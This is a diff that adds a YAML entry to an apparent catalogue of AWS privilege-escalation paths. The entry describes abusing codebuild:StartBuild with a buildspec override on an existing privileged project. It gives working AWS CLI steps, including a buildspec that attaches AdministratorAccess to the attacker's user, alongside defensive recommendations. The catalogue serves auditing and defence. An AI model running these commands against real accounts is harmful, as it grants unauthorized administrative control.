@@ -1,0 +1,95 @@
+id: codebuild-002
+name: codebuild:StartBuild
+category: access-resource
+services:
+- codebuild
+- iam
+description: A principal with `codebuild:StartBuild` can exploit an existing CodeBuild project that has a privileged service role by using the `--buildspec-override` parameter to execute arbitrary commands with elevated permissions. Unlike the PassRole+CreateProject attack, this path does NOT require `iam:PassRole` or `codebuild:CreateProject` permissions. The attacker can replace the project's buildspec with malicious commands that execute with the project's service role permissions, potentially achieving administrative access if the role is sufficiently privileged.
+prerequisites:
+  admin:
+  - A CodeBuild project must already exist in the account
+  - The existing project must have a service role with administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+  - The project must allow buildspec overrides (default behavior unless explicitly disabled)
+  lateral:
+  - A CodeBuild project must already exist in the account
+  - The existing project must have a service role with any level of permissions
+  - The project must allow buildspec overrides (default behavior unless explicitly disabled)
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: aws codebuild list-projects --region us-east-1
+    description: Discover existing CodeBuild projects in the account (optional but helpful for reconnaissance)
+  - step: 2
+    command: aws codebuild batch-get-projects --names EXISTING_PROJECT_NAME --region us-east-1
+    description: Inspect the project details to identify the service role ARN and verify it has elevated permissions (optional but helpful)
+  - step: 3
+    command: |
+      aws codebuild start-build \
+        --project-name EXISTING_PROJECT_NAME \
+        --region us-east-1 \
+        --buildspec-override "version: 0.2
+      phases:
+        build:
+          commands:
+            - echo 'Starting privilege escalation...'
+            - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+            - echo 'Successfully attached AdministratorAccess policy'"
+    description: Start a build with a malicious buildspec that executes with the project's privileged service role. This example attaches AdministratorAccess to your user account.
+  - step: 4
+    command: aws codebuild batch-get-builds --ids BUILD_ID --region us-east-1
+    description: Monitor the build status to confirm it completed successfully
+  - step: 5
+    command: aws iam list-users --max-items 3
+    description: Verify administrative access was successfully obtained (wait 15-30 seconds for IAM propagation)
+limitations: |
+  This path provides administrative access only if the existing CodeBuild project's service role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If the project only has limited permissions, you gain access limited to those permissions. However, even limited access may enable multi-hop privilege escalation attacks.
+
+  This attack requires that an existing CodeBuild project allows buildspec overrides, which is the default behavior. Organizations can disable buildspec overrides in project configuration to prevent this attack vector.
+recommendation: |
+  Restrict `codebuild:StartBuild` permission using resource-based constraints:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "codebuild:StartBuild",
+    "Resource": "arn:aws:codebuild:*:ACCOUNT_ID:project/specific-safe-project"
+  }
+  ```
+
+  Additional security controls:
+  - **Least Privilege Service Roles**: Ensure CodeBuild service roles follow least privilege principles and cannot modify IAM permissions
+  - **Disable Buildspec Override**: For projects with privileged roles, disable buildspec overrides in the project configuration
+  - **CloudTrail Monitoring**: Alert on `StartBuild` API calls with buildspec overrides, especially on projects with privileged roles
+  - **Monitor IAM Changes**: Alert on `AttachUserPolicy`, `PutUserPolicy`, `AttachRolePolicy`, and `PutRolePolicy` calls originating from CodeBuild service principals
+  - **Service Control Policies**: Implement SCPs to prevent CodeBuild service roles from modifying IAM policies
+  - **IAM Access Analyzer**: Use AWS IAM Access Analyzer to identify privilege escalation paths involving CodeBuild projects
+  - **Regular Audits**: Review CodeBuild projects to identify those with privileged service roles and restrict access accordingly
+  - **Separation of Concerns**: Avoid attaching administrative roles to CodeBuild projects; use least-privilege roles specific to build requirements
+discoveredBy:
+  name: Unknown
+  organization: Unknown
+references:
+- title: AWS CodeBuild API Reference - StartBuild
+  url: https://docs.aws.amazon.com/codebuild/latest/APIReference/API_StartBuild.html
+- title: AWS CodeBuild - Build Specification Reference
+  url: https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html
+relatedPaths:
+- codebuild-001
+- iam-001
+- iam-002
+toolSupport:
+  pmapper: false
+  iamVulnerable: false
+  pacu: false
+  prowler: false
+permissions:
+  required:
+  - permission: codebuild:StartBuild
+    resourceConstraints: Must have permission to start builds on the target CodeBuild project
+  additional:
+  - permission: codebuild:ListProjects
+    resourceConstraints: Helpful for discovering existing CodeBuild projects with privileged roles
+  - permission: codebuild:BatchGetProjects
+    resourceConstraints: Useful for viewing project details including service role ARN and permissions
+  - permission: codebuild:BatchGetBuilds
+    resourceConstraints: Helpful for monitoring build execution status and verifying successful exploitation
